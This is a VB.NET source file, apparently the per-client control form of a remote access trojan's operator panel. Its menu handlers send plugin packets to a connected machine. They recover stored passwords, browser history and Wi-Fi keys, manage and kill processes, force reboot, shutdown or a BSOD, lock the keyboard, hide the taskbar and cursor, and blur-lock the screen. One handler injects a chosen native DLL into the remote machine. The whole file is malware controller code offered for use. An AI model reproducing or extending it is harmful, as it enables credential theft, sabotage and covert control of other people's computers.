Imports System.IO
Imports System.Threading
Imports PacketLib.Packet

Public Class Client_Form
    Private C As Clients
    Sub New(Clients As Clients)

        InitializeComponent()

        C = Clients

    End Sub
    Private Async Sub Save_PassMenu_Click(sender As Object, e As EventArgs) Handles Save_PassMenu.Click
        Await Task.Run(Sub() Helpers.SetSavingFor4Columns(Passwords_ListView, Me.Text, "Passwords"))
    End Sub
    Private Async Sub Save_HistoryMenu_Click(sender As Object, e As EventArgs) Handles Save_HistoryMenu.Click
        Await Task.Run(Sub() Helpers.SetSavingFor4Columns(Hist_ListView, Me.Text, "History"))
    End Sub
    Private Async Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        Await Task.Run(Sub() Helpers.SetSavingFor2Columns(W_PW_ListView, Me.Text, "Wifi Passwords"))
    End Sub
    Private Async Sub RecoverPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RecoverPasswordsToolStripMenuItem.Click
        Loading_PW.Visible = True
        Loading_PW.Active = True
        Dim P As New PacketMaker
        P.Type_Packet = PacketType.PLUGIN
        P.Plugin = Plugins._PW

        Await Task.Run(Sub() C.Sender(P))
    End Sub
    Private Async Sub Recover_history_Click(sender As Object, e As EventArgs) Handles Recover_history.Click
        Loading_Hist.Visible = True
        Loading_Hist.Active = True
        Dim P As New PacketMaker
        P.Type_Packet = PacketType.PLUGIN
        P.Plugin = Plugins._WB

        Await Task.Run(Sub() C.Sender(P))
    End Sub
    Private Async Sub RecoverWifiPasswordToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RecoverWifiPasswordToolStripMenuItem.Click
        Loading_W_PW.Visible = True
        Loading_W_PW.Active = True
        Dim P As New PacketMaker
        P.Type_Packet = PacketType.PLUGIN
        P.Plugin = Plugins._W_PW

        Await Task.Run(Sub() C.Sender(P))
    End Sub
    Private Sub Custom_Button1_Click(sender As Object, e As EventArgs) Handles Custom_Button1.Click
        Me.Hide()
    End Sub
    Private Async Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Helper_Task_Label.Visible = True
        Loading_tasks.Visible = True
        Loading_tasks.Active = True
        RefreshToolStripMenuItem.Enabled = False
        Dim P As New PacketMaker
        P.Type_Packet = PacketType.PLUGIN
        P.Plugin = Plugins._TASKS_MGR
        P.Function_Params = New Object() {Packet_Subject.RETRIEVE_TASKS}

        Await Task.Run(Sub() C.Sender(P))
    End Sub

    Private Async Sub KillTaskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillTaskToolStripMenuItem.Click
        If Tasks_listview.SelectedItems.Count = 1 Then
            Dim P As New PacketMaker
            P.Type_Packet = PacketType.PLUGIN
            P.Plugin = Plugins._TASKS_MGR
            P.Function_Params = New Object() {Packet_Subject.KILL_TASK, Tasks_listview.SelectedItems(0).Text}

            Await Task.Run(Sub() C.Sender(P))
        End If
    End Sub

    Private Async Sub PauseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PauseToolStripMenuItem.Click
        If Tasks_listview.SelectedItems.Count = 1 Then
            Dim P As New PacketMaker
            P.Type_Packet = PacketType.PLUGIN
            P.Plugin = Plugins._TASKS_MGR
            P.Function_Params = New Object() {Packet_Subject.PAUSE_TASK, Tasks_listview.SelectedItems(0).Text}

            Await Task.Run(Sub() C.Sender(P))
        End If
    End Sub
    Private Async Sub ResumseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ResumseToolStripMenuItem.Click
        If Tasks_listview.SelectedItems.Count = 1 Then
            Dim P As New PacketMaker
            P.Type_Packet = PacketType.PLUGIN
            P.Plugin = Plugins._TASKS_MGR
            P.Function_Params = New Object() {Packet_Subject.RESUME_TASK, Tasks_listview.SelectedItems(0).Text}

            Await Task.Run(Sub() C.Sender(P))
        End If
    End Sub

    Private Async Sub LaunchToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LaunchToolStripMenuItem.Click
        Dim ID_CMD As Integer = CMD_ListView.SelectedItems(0).Index
        Dim P As New PacketMaker
        P.Type_Packet = PacketType.PLUGIN

        Select Case ID_CMD
            Case 0
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.LOG_OUT}

            Case 1
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.REBOOT}

            Case 2
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.SHUTDOWN}

            Case 3
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.SUSPEND}

            Case 4
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.HIBERNATE}

            Case 5
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.BSOD}

            Case 6
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.MUTE_SOUND}

            Case 7
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.VOLUME, True} ''VOL_UP

            Case 8
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.VOLUME, False}''VOL_DOWN

            Case 9
                P.Plugin = Plugins._KB
                P.Function_Params = New Object() {Packet_Subject.KB_LCK}

            Case 10
                P.Plugin = Plugins._KB
                P.Function_Params = New Object() {Packet_Subject.KB_ULCK}

            Case 11
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.TSK_BAR, 0}'HIDE_TB

            Case 12
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.TSK_BAR, 1}'SHOW_TB

            Case 13
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.DSK_IC, False}'HIDE_IC

            Case 14
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.DSK_IC, True}''SHOW_IC

            Case 15
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.SWAP_MB, True}''SWAP_ON

            Case 16
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.SWAP_MB, False} ''SWAP_OFF

            Case 17
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.EMPTY_BIN}

            Case 18
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.ROTATE_SCREEN, "0"}

            Case 19
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.ROTATE_SCREEN, "90"}

            Case 20
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.ROTATE_SCREEN, "180"}

            Case 21
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.ROTATE_SCREEN, "270"}

            Case 22
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.CURSOR_VISIBILITY, False}''Hide Cursor

            Case 23
                P.Plugin = Plugins._MS
                P.Function_Params = New Object() {Packet_Subject.CURSOR_VISIBILITY, True} ''Hide Cursor

            Case 24
                P.Plugin = Plugins._SL
                P.Function_Params = New Object() {Packet_Subject.BLUR_LK_START}

            Case 25
                P.Plugin = Plugins._SL
                P.Function_Params = New Object() {Packet_Subject.BLUR_LK_STOP}

        End Select

        Await Task.Run(Sub() C.Sender(P))

        Dim BSOD_Fixing As Packet_Subject = CType(P.Function_Params(0), Packet_Subject)

        If BSOD_Fixing = Packet_Subject.BSOD Then

            For Each H As ListViewItem In Dark.AeroListView1.Items

                If H.Text = C.ID Then

                    H.Remove()

                End If
            Next

            Dark.L.Remove(C)

        End If
    End Sub

    Private Sub Client_Form_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        AddHandler Me.SizeChanged, AddressOf Make_Fiex

    End Sub

    Public Sub Make_Fiex()
        ColumnHeader12.Width = CMD_ListView.Width
    End Sub

    Private Sub ListView1_DragDrop(sender As Object, e As DragEventArgs) Handles DLL_NAT_ListView.DragDrop
        Dim files() As String = e.Data.GetData(DataFormats.FileDrop)
        For Each path In files
            MsgBox(path)
        Next
    End Sub

    Private Sub AddToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem.Click

        Dim AddFile As New Thread(Sub()
                                      Using ofd = New OpenFileDialog()

                                          Dim Action As DialogResult = ofd.ShowDialog()
                                          If Action = DialogResult.OK Then ' 
                                              Dim F As New ListViewItem(ofd.FileName)

                                              Dim FI As New FileInfo(ofd.FileName)
                                              F.SubItems.Add(FI.Length.ToString())

                                              DLL_NAT_ListView.Items.Add(F)

                                          End If
                                      End Using


                                  End Sub)

        AddFile.SetApartmentState(ApartmentState.STA)
        AddFile.Start()

    End Sub

    Private Sub RemvoeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemvoeToolStripMenuItem.Click
        If DLL_NAT_ListView.SelectedItems.Count = 1 Then
            DLL_NAT_ListView.Items.Remove(DLL_NAT_ListView.SelectedItems(0))
        End If
    End Sub

    Private Async Sub Inject_Nat_ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Inject_Nat_ToolStripMenuItem.Click
        If DLL_NAT_ListView.SelectedItems.Count = 1 Then
            Dim P As New PacketMaker
            P.Type_Packet = PacketType.PLUGIN_C
            P.Plugin = Plugins._LD


            P.Function_Params = New Object() {Packet_Subject.INJECT_NATIVE, IO.File.ReadAllBytes(DLL_NAT_ListView.SelectedItems(0).Text)}

            Await Task.Run(Sub() C.Sender(P))
        End If
    End Sub
End Class